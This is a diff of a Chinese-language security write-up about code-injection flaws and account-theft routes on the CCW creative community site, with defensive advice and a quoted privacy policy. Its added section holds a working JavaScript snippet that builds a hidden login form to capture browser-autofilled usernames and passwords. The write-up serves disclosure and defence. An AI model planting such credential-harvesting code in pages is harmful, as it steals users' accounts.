@@ -1,9 +1,88 @@
-记录共创世界的前端代码注入漏洞和盗号接口。
+记录共创世界的前端代码注入漏洞和可能的盗号方式。
 
-建议使用 [CCW-Code-Injection-Risk-Warning](https://github.com/bddjr/CCW-Code-Injection-Risk-Warning) 防御部分漏洞。  
+更新时间：北京时间 2026 年 5 月 10 日 20:21
 
 > [!WARNING]  
-> **仅供学习研究用途，请勿编写恶意代码，违者后果自负！**  
+> **仅供学习研究用途，请勿用于网络攻击，违者后果自负！！！**  
+>
+> **For learning and research purposes only. Do not use for cyber attacks. Offenders will bear all the consequences!!!**
+
+> [!TIP]  
+> 建议使用 [CCW-Code-Injection-Risk-Warning](https://github.com/bddjr/CCW-Code-Injection-Risk-Warning) 防御部分漏洞。  
+
+---
+
+## 自动填充账号密码
+
+这本该是浏览器的问题。  
+如果用户没有更改浏览器的相关设置，只要 `<input>` 元素没有填写错误的 autocomplete 属性，浏览器就会自动填充已保存的账号密码，没有经过使用者的许可。  
+
+攻击者成功注入恶意代码之后，可以盗取浏览器自动填充的账号密码，即使网页未显示输入框。  
+
+> 但是，为什么 CCW 的登录界面不会自动填充密码？  
+> 那是因为 CCW 的登录界面的 password 输入框的 autocomplete 属性填的是 "new-password" 。  
+
+参考 https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Attributes/autocomplete
+
+盗号程序演示：
+
+> [!WARNING]  
+> **仅用于测试自己的环境的安全性，不得用于盗取他人账号，违者后果自负！！！**  
+>
+> **For testing the security of your own environment only. Do not use it to steal others' accounts. Offenders will bear all the consequences!!!**  
+
+```js
+// 在浏览器的控制台粘贴代码，然后按键盘上的 enter 。
+// 返回类型 { id: string, password: string } 。
+// 如果返回的 id 和 password 都是空字符串，说明浏览器没有自动填充密码。
+await new Promise((resolve, reject) => {
+    var form, timeoutId;
+    function removeElement() {
+        try { if (form) form.remove() } catch (e) { }
+    }
+    function clearMyTimeout() {
+        try { if (timeoutId) clearTimeout(timeoutId) } catch (e) { }
+    }
+    try {
+        form = document.createElement('form');
+        form.style.display = 'none';
+        form.innerHTML = (
+            `<input type=text name=id autocomplete=username>` +
+            `<input type=password name=password autocomplete=current-password>`
+        );
+        function res() {
+            try {
+                const out = Object.fromEntries(new FormData(form));
+                removeElement();
+                resolve(out);
+            } catch (e) {
+                removeElement();
+                reject(e);
+            }
+        }
+        function oninput() {
+            if (form.lastChild.value && form.firstChild.value) {
+                clearMyTimeout();
+                res();
+            }
+        }
+        form.firstChild.addEventListener('input', oninput)
+        form.lastChild.addEventListener('input', oninput)
+        document.body.appendChild(form);
+        // 3 秒没填充就自动返回
+        timeoutId = setTimeout(res, 3000);
+    } catch (e) {
+        removeElement();
+        clearMyTimeout();
+        reject(e);
+    }
+})
+```
+
+> [!TIP]  
+> 建议禁用浏览器的自动填充密码，或者改为 “在查看或填写网站密码之前提示设备登录选项。始终征求许可”  
+> 
+> ![3](./img/3.png)  
 
 ---
 
@@ -238,7 +317,7 @@ POST https://community-web.ccw.site/students/list_sessions?page=1&perPage=20&sor
 CSense 的作者曾多次强调 CSense 无法盗取用户的密码，却隐瞒了这一事实。  
 早期 CSense 利用该漏洞，将 CSense 使用者的登录信息和 token 发送给 CSense 的作者。
 
-该漏洞在 2026 年 1 月 16 日 被修复，攻击者不能再借助该接口获取 token ，但仍可以获取登录时的时间、IP地址、浏览器版本。
+该漏洞在 2026 年 1 月 16 日 被修复，攻击者不能再借助该接口获取 token ，但仍可以获取登录时的时间、IP地址、浏览器版本，问题不大。
 
 ---
 
@@ -256,11 +335,36 @@ POST https://sso.ccw.site/web/auth/login-by-password
 
 ---
 
-## 盗取浏览器自动填充的账号密码
+## 官方的承诺
 
-攻击者成功注入恶意代码之后，可以盗取浏览器自动填充的账号密码，即使网页未显示输入框。  
+仅供参考，不予置评。  
 
-> [!TIP]  
-> 建议禁用浏览器的自动填充密码，或者改为“在查看或填写网站密码之前提示设备登录选项。始终征求许可”  
-> 
-> ![3](./img/3.png)  
+以下内容节选自《CCW共创世界隐私政策》  
+
+版本更新日期：2021年06月01日  
+本政策生效日期：2021年06月01日  
+
+**五.我们如何存储和保护您的个人信息**  
+（二）个人信息的保护  
+  1. 平台会采取合理可行的措施，尽力避免收集无关的个人信息。平台只会在达成本政策所述目的所需的期限内保留您的个人信息，除非法律有强制的存留要求。在您的个人信息超出保留期间后，平台会根据适用法律的要求删除您的个人信息，或使其匿名化处理。
+
+  2. 我们已通过了公安部信息安全等级保护三级认证，并与监管机构、第三方测评机构建立了良好的协调沟通机制，及时抵御并处置各类信息安全威胁，为您的信息安全提供全方位保障。
+
+  3. 平台已制定个人信息安全事件应急预案，定期组织内部相关人员进行应急响应培训和应急演练，使其掌握岗位职责和应急处置策略和规程。
+
+  4. 如发生个人信息安全事件后，平台将按照法律法规的要求并最迟不迟于 30 个自然日内向您告知：安全事件的基本情况和可能的影响、平台已采取或将要采取的处置措施、您可自主防范和降低风险的建议、对您的补救措施等。事件相关情况平台将以邮件、信函、电话、推送通知等方式告知您，难以逐一告知个人信息主体时，平台会采取合理、有效的方式发布公告。同时，平台还将按照监管部门要求，上报个人信息安全事件的处置情况。
+
+  5. **由于技术的限制以及可能存在的各种恶意手段，在互联网行业，即便竭尽所能加强安全措施，也不可能始终保证信息百分之百的安全，我们将尽力确保您提供给我们的个人信息的安全性。请您知悉并理解，您接入我们的服务所用的系统和通讯网络，有可能因我们可控范围外的因素而出现问题。因此，我们强烈建议您采取积极措施保护个人信息的安全，包括但不限于使用复杂密码、定期修改密码、不将自己的账号密码等个人信息透露给他人。**
+
+---
+
+## 相关文章
+
+- [【社区公告】关于“账号安全”的通知](https://learn.ccw.site/article/998d3e07-7210-4b5a-ab6d-64ac84e3caef)  
+  [共创世界产品汪](https://www.ccw.site/student/6008f86de6894d53dd63749f) 2026-04-16  
+
+- [恶意扩展如何让你上钩？远远不止这些……](https://learn.ccw.site/article/5f06747c-fae9-4ed6-b69e-24016eedbfd3)  
+  [浅_酱_](https://www.ccw.site/student/63d8837e6bc82a13fb855f0a) 2026-04-13  
+
+- [[重要通告]保护账号安全，做对这几件事...](https://learn.ccw.site/article/6af308a5-cb78-465c-bb1e-572c48f0fc5e)  
+  [鸭鸭院长](https://www.ccw.site/student/61039f14fffbe5461b880787) 2025-12-08  
